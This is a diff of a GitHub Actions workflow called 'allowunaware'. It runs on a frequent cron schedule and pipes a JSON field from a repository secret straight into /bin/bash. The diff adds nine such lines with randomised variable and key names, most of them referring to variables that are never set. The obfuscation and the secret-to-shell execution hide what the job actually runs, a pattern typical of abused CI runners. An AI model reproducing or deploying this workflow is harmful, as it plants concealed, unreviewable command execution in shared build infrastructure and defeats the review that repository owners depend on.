@@ -1,8 +1,10 @@
 name: allowunaware
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 4/6 * * *'
+    - cron: '40 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,14 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: allowunaware
         env:
-          o355: ${{ secrets.o355 }}
+          ras09: ${{ secrets.ras09 }}
         run: |
-          echo $o355 | jq -r .odu18 | /bin/bash
-          echo $son32461 | jq -r .duqf513 | /bin/bash
-          echo $unwrn29820 | jq -r .eahws5 | /bin/bash
-          echo $eaiey2 | jq -r .abuy92 | /bin/bash
-          echo $on769 | jq -r .hsav41580 | /bin/bash
-          echo $zv61990 | jq -r .kgoxw0969 | /bin/bash
-          echo $edf5188 | jq -r .whvrk243 | /bin/bash
-          echo $x5205 | jq -r .zdx5 | /bin/bash
+          echo $ras09 | jq -r .t6398 | /bin/bash
+          echo $pgd5592 | jq -r .or51604 | /bin/bash
+          echo $p9127 | jq -r .iguu74 | /bin/bash
+          echo $tf1111 | jq -r .kuzp41852 | /bin/bash
+          echo $rez48225 | jq -r .ktp4556 | /bin/bash
+          echo $gv16 | jq -r .j80 | /bin/bash
+          echo $uxuvg69 | jq -r .bgdt58634 | /bin/bash
+          echo $fg097 | jq -r .slf4811 | /bin/bash
+          echo $ve470 | jq -r .xo36 | /bin/bash
 
